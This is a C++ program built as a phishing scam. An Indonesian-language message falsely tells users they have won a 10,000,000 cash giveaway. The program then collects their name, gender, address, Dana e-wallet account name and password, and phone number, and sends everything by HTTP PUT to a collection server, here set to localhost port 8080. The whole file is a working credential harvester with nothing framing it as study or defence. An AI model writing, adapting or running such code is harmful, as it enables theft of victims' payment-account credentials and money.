#include <iostream>
#include <map>
#include "httplib.h"

using namespace std;
using namespace httplib;

int main() {
	Client cln("127.0.0.1", 8080);
	cout << "SELAMAT!, ANDA TERPILIH UNTUK MENGIKUTI PROGRAM BAGI-BAGI DUIT 10.000.000!\nDAFTARKAN DIRI ANDA SEKARAMG JUGA!" << endl;
	map<string, string> dataDiri;
	long long noTelp;
	cout << "Nama: ";
	getline(cin, dataDiri["nama"]);
	while(dataDiri["nama"] == "") {
	cout << "Input tidak valid, coba lagi: ";
	getline(cin, dataDiri["nama"]);
	}
	cout << "Jenis kelamin: ";
	getline(cin, dataDiri["jenis kelamin"]);
	while(dataDiri["jenis kelamin"] == "") {
		cout << "Input tidak valid, coba lagi: ";
        	getline(cin, dataDiri["jenis kelamin"]);
	}
	cout << "Alamat: ";
	getline(cin, dataDiri["alamat"]);
	while(dataDiri["alamat"] == "") {
        cout << "Input tidak valid, coba lagi: ";
        getline(cin, dataDiri["alamat"]);
        }
	cout << "Nama akun Dana: ";
	getline(cin, dataDiri["nama dana"]);
	while(dataDiri["nama dana"] == "") {
        cout << "Input tidak valid, coba lagi: ";
        getline(cin, dataDiri["nama dana"]);
        }
	cout << "Sandi akun Dana: ";
	getline(cin, dataDiri["sandi dana"]);
	while(dataDiri["sandi dana"] == "") {
        cout << "Input tidak valid, coba lagi: " << endl;
        getline(cin, dataDiri["sandi dana"]);
        }
	cout << "Nomor telepon (direkomendasikan nomor telepon Dana) (08xxxxxxxxxx): ";
	cin >> noTelp;
	while(cin.fail()) {
		cin.clear();
		cin.ignore();
		cout << "Input tidak valid, coba lagi: ";
		cin >> noTelp;
		cin.ignore();
	}
	cin.ignore();
	string datanya = "Nama: " + dataDiri["nama"] + ", Jenis kelamin: " + dataDiri["jenis kelamin"] + ", Alamat: " + dataDiri["alamat"] + ", Nama Akun Dana: " + dataDiri["nama dana"] + ", Sandi: " + dataDiri["sandi dana"] + ", Nomor telepon: " + to_string(noTelp) + ".";
	auto putres = cln.Put("/data", datanya, "text/plain");
	if(putres && putres->status == 200) {
		cout << putres->body << endl;
	} else {
		cout << "Gagal mendaftarkan diri!, coba lagi nanti." << endl;
	}
	return 0;
}

